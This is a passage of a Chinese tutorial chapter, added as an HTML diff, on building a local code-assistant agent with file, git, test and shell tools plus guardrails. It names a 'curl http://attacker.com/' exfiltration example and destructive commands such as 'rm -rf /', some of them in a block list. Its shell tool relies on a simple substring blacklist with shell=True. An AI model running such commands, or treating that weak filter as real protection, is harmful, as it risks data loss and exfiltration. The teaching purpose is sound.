@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第 17 章：项目 2 — 代码助手 Agent —— 一个能读仓库 / 跑测试 / 提 PR 的本地 Agent | AGENT开发从入门到精通</title>
+<link rel="stylesheet" href="/assets/css/site.css">
+<link rel="stylesheet" href="/assets/css/book.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<style>
+:root {
+  --book-accent-fg: #c026d3;
+  --book-accent-bg: #f97316;
+}
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif; max-width: 900px; margin: 0 auto; padding: 24px; background: #fafafa; color: #333; }
+header.chapter-header { background: linear-gradient(135deg, rgba(192,38,211,0.1) 0%, rgba(249,115,22,0.1) 100%); padding: 24px; border-radius: 12px; margin-bottom: 24px; border: 1px solid rgba(192,38,211,0.2); }
+header.chapter-header h1 { margin: 0 0 8px 0; color: #c026d3; font-size: 28px; }
+header.chapter-header .chapter-meta { color: #666; font-size: 14px; }
+nav.chapter-pager { display: flex; justify-content: space-between; gap: 16px; margin-top: 50px; padding-top: 24px; border-top: 1px solid rgba(192,38,211,0.2); }
+nav.chapter-pager a { padding: 12px 20px; border: 1px solid rgba(192,38,211,0.4); border-radius: 8px; color: var(--book-accent-fg, #c026d3); text-decoration: none; }
+nav.chapter-pager a:hover { background: rgba(192,38,211,0.05); }
+footer { margin-top: 60px; padding-top: 24px; border-top: 1px solid rgba(192,38,211,0.2); color: #888; font-size: 13px; text-align: center; }
+blockquote { border-left: 4px solid var(--book-accent-fg, #c026d3); padding: 8px 16px; margin: 16px 0; background: rgba(192,38,211,0.05); border-radius: 4px; }
+table { border-collapse: collapse; margin: 16px 0; width: 100%; font-size: 14px; }
+th, td { border: 1px solid #ddd; padding: 8px; }
+th { background: rgba(192,38,211,0.1); }
+code { background: rgba(192,38,211,0.1); padding: 2px 4px; border-radius: 3px; font-family: ui-monospace, "Cascadia Code", Menlo, monospace; font-size: 0.9em; }
+pre { background: #1e1e1e; color: #d4d4d4; padding: 16px; border-radius: 8px; overflow-x: auto; margin: 16px 0; }
+pre code { background: transparent; padding: 0; color: #d4d4d4; }
+</style>
+</head>
+<body>
+<header class="chapter-header">
+<h1>第 17 章：项目 2 — 代码助手 Agent —— 一个能读仓库 / 跑测试 / 提 PR 的本地 Agent</h1>
+<div class="chapter-meta">第 17 章 · 第四部分（实战项目）Day 2 / 5 · 8 工具 + 600 行 4 文件 + IDE 集成 + 安全护栏</div>
+</header>
+
+<h1>第 17 章：项目 2 — 代码助手 Agent —— 一个能读仓库 / 跑测试 / 提 PR 的本地 Agent</h1>
+<blockquote><strong>章节定位</strong>：Part 4 · 项目实战 · Day 2 / 5<br><strong>前置章节</strong>：ch16《项目 1 — 个人助理 Agent》<br><strong>后续章节</strong>：ch18《项目 3 — 研究型 Agent》<br><strong>预计阅读</strong>：65 分钟 · 实操 10-12 小时</blockquote>
+<p>---</p>
+<h2 id="17.1-引子：从-ch16-个人助理到-ch17-代码助手">17.1 引子：从 ch16 个人助理到 ch17 代码助手</h2>
+<h3>17.1.1 Part 4 Day 2 定位</h3>
+<p>ch16 给我们一个 200 行单文件、5 工具的个人助理 Agent——能查日历 / 发邮件 / 调 API / 发提醒 / 管待办。但当你打开 <code>~/projects/my-saas/</code> 看到一个 80 文件、12k 行的代码仓库，你会发现 <strong>ch16 的"查日历"技能几乎派不上用场</strong>：</p>
+<blockquote>我们真正需要的是一个能 <strong>"读仓库 / 跑测试 / 提 PR"</strong> 的代码助手。</blockquote>
+<p>这就是 ch17。本章我们要构建一个 <strong>8 工具 + 600 行多文件 + IDE 集成</strong> 的代码助手 Agent。它能做：</p>
+<table><tr><th>编号</th><th>工具</th><th>作用</th><th>ch16 有吗</th></tr><tr><td>1</td><td><strong>ls</strong></td><td>列出目录文件</td><td>❌</td></tr><tr><td>2</td><td><strong>find</strong></td><td>按名搜索文件</td><td>❌</td></tr><tr><td>3</td><td><strong>grep</strong></td><td>按内容搜索代码</td><td>❌</td></tr><tr><td>4</td><td><strong>git status / diff / log</strong></td><td>查看仓库状态 / 变更 / 历史</td><td>❌</td></tr><tr><td>5</td><td><strong>test</strong></td><td>跑单元测试</td><td>❌</td></tr><tr><td>6</td><td><strong>run</strong></td><td>执行任意 Shell 命令</td><td>❌</td></tr><tr><td>7</td><td><strong>lint</strong></td><td>代码静态检查</td><td>❌</td></tr><tr><td>8</td><td><strong>format</strong></td><td>代码格式化</td><td>❌</td></tr></table>
+<p><strong>ch16 vs ch17 能力对比表</strong>：</p>
+<table><tr><th>维度</th><th>ch16（个人助理）</th><th>ch17（代码助手）</th></tr><tr><td><strong>工具数</strong></td><td>5（日历/邮件/API/提醒/待办）</td><td>8（ls/find/grep/git/test/run/lint/format）</td></tr><tr><td><strong>代码量</strong></td><td>200 行单文件</td><td>600 行 4 文件</td></tr><tr><td><strong>风险等级</strong></td><td>低（读多写少，撤错成本低）</td><td><strong>高</strong>（shell 命令能 <code>rm -rf /</code>，<strong>代码助手必须安全护栏</strong>）</td></tr><tr><td><strong>IDE 集成</strong></td><td>否（CLI / FastAPI / IM webhook）</td><td><strong>是</strong>（Cursor / Claude Code / Continue / Cody 4 类）</td></tr><tr><td><strong>部署模式</strong></td><td>CLI / FastAPI / IM webhook</td><td>CLI / IDE sidebar / Web editor / <strong>MCP 协议</strong></td></tr><tr><td><strong>学习时长</strong></td><td>5-8 小时</td><td>10-12 小时</td></tr></table>
+<h3>17.1.2 8 工具场景表</h3>
+<table><tr><th>工具</th><th>用户故事</th><th>风险</th></tr><tr><td><strong>ls</strong></td><td>"列出 src/ 下所有文件"</td><td>🟢 低（只读）</td></tr><tr><td><strong>find</strong></td><td>"找所有 *.test.ts 文件"</td><td>🟢 低（只读）</td></tr><tr><td><strong>grep</strong></td><td>"搜所有 TODO 注释"</td><td>🟢 低（只读）</td></tr><tr><td><strong>git status</strong></td><td>"看我改了哪些文件"</td><td>🟢 低（只读）</td></tr><tr><td><strong>git diff</strong></td><td>"看具体改了什么"</td><td>🟢 低（只读）</td></tr><tr><td><strong>git log</strong></td><td>"看最近 10 个 commit"</td><td>🟢 低（只读）</td></tr><tr><td><strong>test</strong></td><td>"跑一遍单元测试"</td><td>🟡 中（副作用，可能写 .pyc）</td></tr><tr><td><strong>run</strong></td><td>"执行 npm install"</td><td>🔴 高（任意 shell 命令）</td></tr><tr><td><strong>lint</strong></td><td>"跑 ESLint"</td><td>🟡 中（修改文件或仅报告）</td></tr><tr><td><strong>format</strong></td><td>"格式化整个 src/"</td><td>🔴 高（修改文件）</td></tr></table>
+<p><strong>风险分级定义</strong>：</p>
+<ul><li>🟢 <strong>只读</strong>：不会修改任何文件或环境状态</li><li>🟡 <strong>副作用可控</strong>：可能产生缓存文件，但不修改源码</li><li>🔴 <strong>写操作</strong>：可能修改源码或系统状态——<strong>必须用户确认</strong></li></ul>
+<h3>17.1.3 单 Agent 安全护栏原则</h3>
+<p>代码助手和个人助理的最大区别是 <strong>风险等级</strong>：</p>
+<table><tr><th>行为</th><th>个人助理的后果</th><th>代码助手的后果</th></tr><tr><td><strong>误删除日历事件</strong></td><td>用户手动恢复</td><td>❌ 不可逆</td></tr><tr><td><strong>误发邮件给错误收件人</strong></td><td>可以撤回（有 5-30s 窗口）</td><td>❌ 不适用</td></tr><tr><td><strong>误 <code>rm -rf src/</code></strong></td><td>不适用</td><td>🔥 <strong>仓库永久损坏</strong></td></tr><tr><td><strong>误 <code>git push --force</code></strong></td><td>不适用</td><td>🔥 <strong>远程历史被覆盖</strong></td></tr><tr><td><strong>误 <code>sudo apt remove</code></strong></td><td>不适用</td><td>🔥 <strong>系统损坏</strong></td></tr></table>
+<blockquote><strong>ch17 第一原则</strong>：<strong>read-only 默认</strong>——所有写操作（git commit / 写文件 / 执行 set / install）必须用户显式确认。</blockquote>
+<p>这就是 ch17 比 ch16 多出来的"安全护栏"——ch07-15 都没讲，ch23 安全章节会展开，ch17 是 Part 4 第一个安全专章。</p>
+<h3>17.1.4 ch17 vs ch18-20 的定位</h3>
+<p>Part 4 五个项目难度递增：</p>
+<table><tr><th>章</th><th>主题</th><th>工具数</th><th>风险等级</th><th>集成点</th></tr><tr><td>ch16</td><td>个人助理</td><td>5</td><td>🟢</td><td>CLI / FastAPI / IM</td></tr><tr><td><strong>ch17</strong></td><td><strong>代码助手</strong></td><td><strong>8</strong></td><td><strong>🔴 高</strong></td><td><strong>IDE + MCP</strong></td></tr><tr><td>ch18</td><td>研究型</td><td>10</td><td>🟡</td><td>Web search + ArXiv</td></tr><tr><td>ch19</td><td>数据分析</td><td>12</td><td>🟡</td><td>SQL + 图表</td></tr><tr><td>ch20</td><td>Browser-Use</td><td>6</td><td>🟢</td><td>浏览器自动化</td></tr></table>
+<p>ch17 是 Part 4 <strong>最危险</strong>也最有教学价值的一章——它给读者建立"Agent 不仅要能做，还要安全地做"的工程直觉。</p>
+<h3>17.1.5 ch17 的工程意义</h3>
+<p>为什么 ch17 必须有安全护栏？因为 ch17 是读者<strong>第一次把 Agent 接入"能改文件系统"的工具</strong>。</p>
+<table><tr><th>Agent 类型</th><th>失败模式</th><th>后果</th></tr><tr><td><strong>ch16 个人助理</strong></td><td>LLM 误调日历工具</td><td>用户手动撤销（5 分钟）</td></tr><tr><td><strong>ch17 代码助手</strong></td><td>LLM 误调 <code>rm</code> / <code>git push --force</code></td><td><strong>仓库永久损坏 / 远程历史被覆盖</strong></td></tr></table>
+<p>这就是 <strong>ch23 §23.3 提示词注入</strong> 攻击的核心场景——如果 Agent 工具集里有 shell，攻击者能让 Agent 把"用户密码" 误传到 <code>curl http://attacker.com/...</code>。ch17 通过 _BLACKLIST + _ALLOW_WRITE + audit.log <strong>三道防线</strong>给读者建立这种安全直觉。</p>
+<p>---</p>
+<div style="background:linear-gradient(135deg, rgba(192,38,211,0.08) 0%, rgba(249,115,22,0.08) 100%); border-radius:12px; padding:24px; margin:24px 0; border:1px solid rgba(192,38,211,0.2);">
+<h3 style="margin-top:0; color:#c026d3;">🔧 第 14 种 inline SVG 形态学：IDE 集成拓扑（800×400）</h3>
+<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg" style="width:100%; max-width:800px; height:auto; font-family:system-ui; display:block; margin:0 auto;">
+  <defs>
+    <marker id="arr-s17" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+      <path d="M0,0 L0,6 L9,3 z" fill="#c026d3"/>
+    </marker>
+    <marker id="arr-fb" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
+      <path d="M0,0 L0,6 L9,3 z" fill="#10b981"/>
+    </marker>
+    <linearGradient id="ide-grad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#c026d3"/>
+      <stop offset="100%" style="stop-color:#f97316"/>
+    </linearGradient>
+  </defs>
+  <!-- 左侧 IDE Editor (200x300) -->
+  <rect x="40" y="60" width="200" height="280" rx="8" fill="#1e1e1e" stroke="#c026d3" stroke-width="2"/>
+  <rect x="40" y="60" width="200" height="24" rx="8" fill="#2d2d2d"/>
+  <text x="50" y="76" fill="#d4d4d4" font-size="11">📝 IDE Editor</text>
+  <text x="50" y="110" fill="#888" font-size="10">// ch17 用户查询</text>
+  <text x="50" y="130" fill="#d4d4d4" font-size="11">user: "找所有 TODO"</text>
+  <text x="50" y="155" fill="#c026d3" font-size="10">// sidebar 自动调</text>
+  <text x="50" y="175" fill="#fff" font-size="11">→ ch17 MCP server</text>
+  <text x="50" y="200" fill="#10b981" font-size="10">// 反馈</text>
+  <text x="50" y="220" fill="#d4d4d4" font-size="11">← result</text>
+  <text x="50" y="245" fill="#888" font-size="9">Cursor / Claude Code /</text>
+  <text x="50" y="258" fill="#888" font-size="9">Continue / Cody</text>
+  <!-- 中间 8 工具网格 (2x4) -->
+  <text x="420" y="45" text-anchor="middle" fill="#c026d3" font-size="13" font-weight="bold">8 工具网格（ch07 Function Calling）</text>
+  <!-- row 1 -->
+  <rect x="320" y="60" width="200" height="40" rx="4" fill="#fff" stroke="#c026d3" stroke-width="1.5"/>
+  <text x="420" y="78" text-anchor="middle" fill="#c026d3" font-size="11" font-weight="bold">📁 ls / find / grep</text>
+  <text x="420" y="92" text-anchor="middle" fill="#666" font-size="9">只读组（3 工具）</text>
+  <rect x="540" y="60" width="200" height="40" rx="4" fill="#fff" stroke="#c026d3" stroke-width="1.5"/>
+  <text x="640" y="78" text-anchor="middle" fill="#c026d3" font-size="11" font-weight="bold">🔀 git status/diff/log</text>
+  <text x="640" y="92" text-anchor="middle" fill="#666" font-size="9">只读组（3 工具）</text>
+  <!-- row 2 -->
+  <rect x="320" y="115" width="200" height="40" rx="4" fill="#fff" stroke="#f97316" stroke-width="1.5"/>
+  <text x="420" y="133" text-anchor="middle" fill="#f97316" font-size="11" font-weight="bold">🧪 test</text>
+  <text x="420" y="147" text-anchor="middle" fill="#666" font-size="9">副作用组（副作用：缓存）</text>
+  <rect x="540" y="115" width="200" height="40" rx="4" fill="#fff" stroke="#dc2626" stroke-width="2"/>
+  <text x="640" y="133" text-anchor="middle" fill="#dc2626" font-size="11" font-weight="bold">⚠️ run</text>
+  <text x="640" y="147" text-anchor="middle" fill="#666" font-size="9">写操作组（ALLOW_WRITE + 黑名单）</text>
+  <!-- row 3 -->
+  <rect x="320" y="170" width="200" height="40" rx="4" fill="#fff" stroke="#f97316" stroke-width="1.5"/>
+  <text x="420" y="188" text-anchor="middle" fill="#f97316" font-size="11" font-weight="bold">🔍 lint</text>
+  <text x="420" y="202" text-anchor="middle" fill="#666" font-size="9">副作用组（报告）</text>
+  <rect x="540" y="170" width="200" height="40" rx="4" fill="#fff" stroke="#dc2626" stroke-width="2"/>
+  <text x="640" y="188" text-anchor="middle" fill="#dc2626" font-size="11" font-weight="bold">⚠️ format</text>
+  <text x="640" y="202" text-anchor="middle" fill="#666" font-size="9">写操作组（dry-run 默认）</text>
+  <!-- row 4 -->
+  <rect x="430" y="225" width="200" height="40" rx="4" fill="url(#ide-grad)" opacity="0.9"/>
+  <text x="530" y="243" text-anchor="middle" fill="#fff" font-size="11" font-weight="bold">🛡 安全护栏 (ch17 §17.7)</text>
+  <text x="530" y="257" text-anchor="middle" fill="#fff" font-size="9">_ALLOW_WRITE + _BLACKLIST + audit.log + dry-run</text>
+  <!-- 中心 → 8 工具的连线（invoke 实线） -->
+  <line x1="240" y1="200" x2="320" y2="80" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <line x1="240" y1="200" x2="540" y2="80" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <line x1="240" y1="200" x2="320" y2="135" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <line x1="240" y1="200" x2="540" y2="135" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <line x1="240" y1="200" x2="320" y2="190" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <line x1="240" y1="200" x2="540" y2="190" stroke="#c026d3" stroke-width="1.5" marker-end="url(#arr-s17)"/>
+  <!-- 测试反馈回路（绿色虚线） -->
+  <path d="M 520 155 Q 700 280 200 280 Q 100 280 130 220" stroke="#10b981" stroke-width="2" fill="none" stroke-dasharray="6,4" marker-end="url(#arr-fb)"/>
+  <text x="640" y="290" fill="#10b981" font-size="10" font-weight="bold">↻ 测试反馈</text>
+  <text x="640" y="304" fill="#10b981" font-size="9">test → format → lint</text>
+  <text x="640" y="316" fill="#10b981" font-size="9">→ IDE 实时刷新</text>
+  <!-- callout -->
+  <rect x="40" y="350" width="280" height="40" rx="4" fill="rgba(192,38,211,0.08)" stroke="rgba(192,38,211,0.3)"/>
+  <text x="50" y="370" fill="#c026d3" font-size="11" font-weight="bold">第 14 种 SVG 形态学</text>
+  <text x="50" y="384" fill="#666" font-size="10">IDE 集成拓扑 — vs ch13: 加 sidebar + 反馈回路</text>
+  <rect x="500" y="350" width="280" height="40" rx="4" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)"/>
+  <text x="510" y="370" fill="#f97316" font-size="11" font-weight="bold">8 工具风险分级</text>
+  <text x="510" y="384" fill="#666" font-size="10">5 只读 + 2 副作用 + 2 写操作（rc/run format）</text>
+</svg>
+</div>
+<h2 id="17.2-需求分析：8-工具-×-5-用户故事">17.2 需求分析：8 工具 × 5 用户故事</h2>
+<h3>17.2.1 5 类用户故事</h3>
+<table><tr><th>用户</th><th>需求</th><th>工具组合</th></tr><tr><td><strong>独立开发者</strong></td><td>"我刚接手一个项目，帮我在 README 里找出所有未实现的功能"</td><td>find + grep + git log</td></tr><tr><td><strong>Code Reviewer</strong></td><td>"这次 PR 改了 12 个文件，跑一遍测试 + lint + format 然后给我报告"</td><td>git diff + test + lint + format</td></tr><tr><td><strong>学习者</strong></td><td>"这个开源项目怎么启动？找 docker-compose.yml + README + Makefile"</td><td>find + grep + cat</td></tr><tr><td><strong>贡献者</strong></td><td>"帮我 fork 后克隆，建新分支，按 commit 规范提交，提 PR 描述"</td><td>git clone + git checkout + git commit + git push</td></tr><tr><td><strong>Debug</strong></td><td>"这个 test 一直 fail，搜错误码，跑测试，把相关 stacktrace 给我"</td><td>grep + test + run</td></tr></table>
+<h3>17.2.2 优先级矩阵</h3>
+<table><tr><th>工具</th><th>MVP</th><th>标准版</th><th>高级版</th></tr><tr><td>ls</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>find</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>grep</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>git status</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>git diff</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>git log</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>test</td><td></td><td>✅</td><td>✅</td></tr><tr><td>run</td><td></td><td>✅</td><td>✅</td></tr><tr><td>lint</td><td></td><td></td><td>✅</td></tr><tr><td>format</td><td></td><td></td><td>✅</td></tr></table>
+<ul><li><strong>MVP（30 行）</strong>：只 6 个只读工具，覆盖 70% 场景</li><li><strong>标准版（200 行）</strong>：+ test + run（共 8 工具）—— <strong>ch17 主版本</strong></li><li><strong>高级版（600 行）</strong>：+ lint + format + audit log + IDE 集成</li></ul>
+<h3>17.2.3 ch16 → ch17 增量</h3>
+<p>ch17 不是从零写——是基于 ch16 个人助理的 5 工具 + 主循环骨架扩展：</p>
+<pre><code class="language-python"># ch16 5 工具（示意 dict）
+TOOLS_16 = {
+    "calendar": handle_calendar,
+    "email": handle_email,
+    "weather": handle_weather,
+    "reminder": handle_reminder,
+    "todo": handle_todo,
+}
+
+# ch17 8 工具（同样 dict 结构 + 安全层）
+TOOLS_17 = {
+    "ls": handle_ls,
+    "find": handle_find,
+    "grep": handle_grep,
+    "git_status": handle_git_status,
+    "git_diff": handle_git_diff,
+    "test": handle_test,
+    "run": handle_run,
+    "lint": handle_lint,
+    # ch16 没有的安全层
+    "_ALLOW_WRITE": False,  # 默认只读
+    "_BLACKLIST": ["rm -rf /", "sudo", "git push --force"],
+}</code></pre>
+<p>工具调用的 <strong>主循环</strong>（ch16 §16.7.1）几乎一模一样，<strong>变化的只是 tools dict 和 security layer</strong>。</p>
+<p>---</p>
+<h2 id="17.3-30-行-Hello-World：最小可跑代码助手">17.3 30 行 Hello World：最小可跑代码助手</h2>
+<h3>17.3.1 ch07↔ch17 Schema 映射</h3>
+<p>ch16 用了 5 个工具的 JSON Schema（ch07 §7.2 协议），ch17 同样——但增加到 8 个，且每个工具的 Schema 都比 ch16 严格：</p>
+<table><tr><th>维度</th><th>ch16 工具</th><th>ch17 工具</th></tr><tr><td><strong>典型参数数</strong></td><td>0-2 个</td><td>1-3 个</td></tr><tr><td><strong>必有 description</strong></td><td>是</td><td>是</td></tr><tr><td><strong>enum 限制</strong></td><td>偶尔</td><td>每个枚举路径 / 命令都用 enum</td></tr><tr><td><strong>required 字段</strong></td><td>通常 1 个</td><td>通常 2-3 个</td></tr><tr><td><strong>示例对象</strong></td><td>0 个</td><td>每个工具 1 个 example</td></tr></table>
+<p>ch17 的 grep 工具 Schema 示例：</p>
+<pre><code class="language-json">{
+  "name": "grep",
+  "description": "在指定目录递归搜索内容（只读），返回匹配的文件:行号:内容",
+  "parameters": {
+    "type": "object",
+    "properties": {
+      "pattern": {
+        "type": "string",
+        "description": "正则表达式（如 'TODO|FIXME'）"
+      },
+      "path": {
+        "type": "string",
+        "description": "搜索根目录，相对路径，必须在项目根内"
+      },
+      "file_glob": {
+        "type": "string",
+        "description": "可选，限制文件类型如 '*.py'",
+        "default": "*"
+      }
+    },
+    "required": ["pattern", "path"]
+  }
+}</code></pre>
+<h3>17.3.1a ch07 三协议在 ch17 8 工具上的应用</h3>
+<p>ch07 §7.4 对比了 OpenAI / Anthropic / Google 三种 Function Calling 协议，ch17 8 个工具的 Schema 必须严格匹配所选协议——选错协议会导致所有工具调用失败。</p>
+<table><tr><th>工具</th><th>OpenAI <code>tools</code> 字段</th><th>Anthropic <code>tools</code> 字段</th><th>Google <code>tools</code> 字段</th></tr><tr><td><strong>ls / find / grep</strong></td><td><code>tools: [{type:"function", function:{name, description, parameters}}]</code></td><td><code>tools: [{name, description, input_schema}]</code></td><td><code>tools: [{functionDeclarations: [{name, description, parameters}]}]</code></td></tr><tr><td><strong>test / run</strong></td><td>同上 + <code>strict: true</code></td><td>同上 + 自动 parallel tool calls</td><td>同上 + <code>parameters.required</code> 必填</td></tr><tr><td><strong>lint / format</strong></td><td>同上 + 在 description 里强调 dry-run</td><td>同上 + description 必须含 <code>Caution</code> 关键字</td><td>同上</td></tr></table>
+<p><strong>ch17 默认协议选型</strong>：<strong>OpenAI 协议</strong>。理由：</p>
+<ol><li><strong>生态最大</strong>：Cursor / Continue / Cody 等 IDE 都原生支持 OpenAI 协议</li><li><strong>第三方库最全</strong>：LangChain / LlamaIndex / OpenAI Agents SDK 都围绕 OpenAI 协议</li><li><strong>文档完整</strong>：OpenAI Cookbook 有完整 examples</li></ol>
+<p>如果读者硬要用 Anthropic SDK 或 Google Gemini，只需替换 Schema 字段名（<code>parameters</code> → <code>input_schema</code>），handler 逻辑完全不变。</p>
+<h3>17.3.1b 7 字段必须填的强制约束</h3>
+<p>无论选哪个协议，ch17 的 JSON Schema 都必须严格定义：</p>
+<table><tr><th>#</th><th>字段</th><th>原因</th><th>ch17 处理</th></tr><tr><td>1</td><td><code>name</code> 工具名</td><td>LLM 必须知道调用哪个</td><td>全部 snake_case</td></tr><tr><td>2</td><td><code>description</code></td><td>LLM 决定何时调</td><td>全部 50-200 字</td></tr><tr><td>3</td><td><code>parameters.type</code></td><td>JSON Schema 必备</td><td>全部 <code>"object"</code></td></tr><tr><td>4</td><td><code>properties.&lt;field&gt;.type</code></td><td>参数类型</td><td>全部 <code>string/integer/boolean/enum</code></td></tr><tr><td>5</td><td><code>properties.&lt;field&gt;.description</code></td><td>LLM 知道怎么填</td><td>全部 30-100 字</td></tr><tr><td>6</td><td><code>required</code></td><td>哪些参数必须</td><td>ch17 全部至少 1 个</td></tr><tr><td>7</td><td>（OpenAI 专属）<code>strict: true</code></td><td>严格 schema 验证</td><td>全部开启</td></tr></table>
+<p><strong>反例</strong>（缺 6/7 字段，导致 LLM 调用失败）：</p>
+<pre><code class="language-json">{"name": "ls", "description": "列文件"}</code></pre>
+<p><strong>正例</strong>（ch17 风格）：</p>
+<pre><code class="language-json">{"name":"ls","description":"列出目录文件...","strict":true,
+ "parameters":{"type":"object","properties":{
+   "path":{"type":"string","description":"项目内相对路径"}},
+   "required":["path"]}}</code></pre>
+<h3>17.3.2 30 行最小代码（mock 模式）</h3>
+<pre><code class="language-python"># ch17_minimal.py — 30 行最小可跑代码助手
+import json, subprocess
+
+TOOLS = {
+    "ls":   {"params": ["path"], "handler": lambda p: subprocess.run(["ls", p], capture_output=True, text=True).stdout},
+    "find": {"params": ["name"], "handler": lambda n: subprocess.run(["find", ".", "-name", n], capture_output=True, text=True).stdout},
+    "grep": {"params": ["pattern", "path"], "handler": lambda p, d: subprocess.run(["grep", "-rn", p, d], capture_output=True, text=True).stdout},
+    "git_status": {"params": [], "handler": lambda: subprocess.run(["git", "status", "--short"], capture_output=True, text=True).stdout},
+}
+
+def call_tool(name, args):
+    return TOOLS[name]["handler"](*args)
+
+# demo
+print("=== ls ===");      print(call_tool("ls", ["."]))
+print("=== git ===");     print(call_tool("git_status", []))
+print("=== find *.py ==="); print(call_tool("find", ["*.py"]))
+print("=== grep TODO ==="); print(call_tool("grep", ["TODO", "."]))</code></pre>
+<p><strong>跑通后预期输出</strong>（假设在 ch17 仓库根目录）：</p>
+<pre><code class="language-text">=== ls ===
+AGENTS.md
+README.md
+ch17_minimal.py
+...
+
+=== git ===
+M ch17-code-assistant.md
+
+=== find *.py ===
+./ch17_minimal.py
+
+=== grep TODO ===
+./ch17_minimal.py:23:# TODO 加 error handling</code></pre>
+<blockquote><strong>30 行代码就是 ch17 的全部核心</strong>：tools dict + handler + 主循环。第 4-7 节我们把它扩展到 600 行 + 4 文件。</blockquote>
+<h3>17.3.3 mock 模式 vs 真 shell</h3>
+<table><tr><th>模式</th><th>ch17_minimal.py 现状</th><th>切换方式</th></tr><tr><td><strong>mock 模式</strong></td><td>用 subprocess 真跑 ls / find / grep / git</td><td>（当前即 mock）</td></tr><tr><td><strong>真 LLM 模式</strong></td><td>第 1 步：mock 给 LLM 喂手工 query，第 2 步：让 LLM 自决定</td><td><code>agent = CodeAssistantAgent(llm=OpenAI())</code></td></tr></table>
+<p>ch17_minimal.py <strong>已经是真 shell</strong>（不是模拟）——"mock" 在这里的含义是 <strong>LLM 决策是 mock</strong>（人写死），不是 shell 执行是 mock。</p>
+<p>---</p>
+<h2 id="17.4-8-工具扩展">17.4 8 工具扩展</h2>
+<h3>17.4.1 ls / find / grep handler（只读组）</h3>
+<pre><code class="language-python">def handle_ls(path: str) -&gt; str:
+    """列出 path 下文件（不含隐藏）。path 必须在项目根内。"""
+    safe = _safe_path(path)
+    out = subprocess.run(["ls", "-la", safe], capture_output=True, text=True, timeout=5)
+    return out.stdout or "(空目录)"
+
+def handle_find(name: str, path: str = ".") -&gt; str:
+    """按文件名搜索，path 必须在项目根内。"""
+    safe = _safe_path(path)
+    out = subprocess.run(
+        ["find", safe, "-name", name, "-not", "-path", "*/node_modules/*", "-not", "-path", "*/.git/*"],
+        capture_output=True, text=True, timeout=10
+    )
+    return out.stdout[:5000] or "(未找到)"
+
+def handle_grep(pattern: str, path: str = ".", file_glob: str = "*") -&gt; str:
+    """正则搜索文件内容。"""
+    safe = _safe_path(path)
+    out = subprocess.run(
+        ["grep", "-rn", "--include=" + file_glob, pattern, safe],
+        capture_output=True, text=True, timeout=15
+    )
+    return out.stdout[:8000] or "(未找到)"</code></pre>
+<h3>17.4.2 git status / diff / log handler（只读组）</h3>
+<pre><code class="language-python">def handle_git_status() -&gt; str:
+    """查看工作区变更（短格式）。"""
+    out = subprocess.run(["git", "status", "--short"], capture_output=True, text=True, timeout=5)
+    return out.stdout or "(无变更)"
+
+def handle_git_diff(file: str = "") -&gt; str:
+    """查看变更详情。可选 file 过滤单个文件。"""
+    args = ["git", "diff"]
+    if file: args.append(file)
+    out = subprocess.run(args, capture_output=True, text=True, timeout=10)
+    return out.stdout[:10000] or "(无 diff)"
+
+def handle_git_log(n: int = 10) -&gt; str:
+    """查看最近 n 个 commit。"""
+    out = subprocess.run(
+        ["git", "log", "--oneline", f"-{n}"],
+        capture_output=True, text=True, timeout=5
+    )
+    return out.stdout or "(无历史)"</code></pre>
+<h3>17.4.3 test / run handler（副作用组）</h3>
+<pre><code class="language-python">def handle_test(cmd: str, cwd: str = ".") -&gt; str:
+    """跑测试。cmd 必须是 pytest 或 npm test，禁止其他。"""
+    if cmd not in ("pytest", "npm test", "yarn test", "pnpm test"):
+        return "❌ 非法测试命令，仅允许 pytest / npm test / yarn test / pnpm test"
+    safe = _safe_path(cwd)
+    out = subprocess.run(cmd.split() + ["--tb=short"], capture_output=True, text=True,
+                       timeout=120, cwd=safe)
+    return f"=== STDOUT ===\n{out.stdout[-3000:]}\n=== STDERR ===\n{out.stderr[-1500:]}"
+
+def handle_run(cmd: str) -&gt; str:
+    """⚠️ 高危！执行任意 shell 命令。需要 _ALLOW_WRITE=True。"""
+    if not _ALLOW_WRITE:
+        return "❌ 默认只读模式。要执行写操作请先 ALLOW_WRITE=True"
+    if any(bad in cmd for bad in _BLACKLIST):
+        return f"❌ 黑名单命令被拦截：{cmd[:50]}"
+    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+    _audit(cmd, out.returncode)
+    return out.stdout[-3000:] or out.stderr[-1500:]</code></pre>
+<p><strong>注</strong>：所有 <code>_ALLOW_WRITE=True</code> 通过的 <code>run</code>/<code>format</code> 调用，都会调 <code>_audit()</code>（在 §17.5.2）记录到 <code>audit.log</code>。该文件必须 <code>git tracked</code>，便于事后审计。</p>
+<h3>17.4.4 lint / format handler（写操作组）</h3>
+<pre><code class="language-python">def handle_lint(cmd: str = "ruff check .") -&gt; str:
+    """代码静态检查（默认 ruff）。"""
+    if cmd not in ("ruff check .", "flake8 .", "eslint .", "pylint ."):
+        return "❌ 非法 lint 命令"
+    out = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=60)
+    return out.stdout[-3000:] or out.stderr[-1500:] or "✅ lint 通过"
+
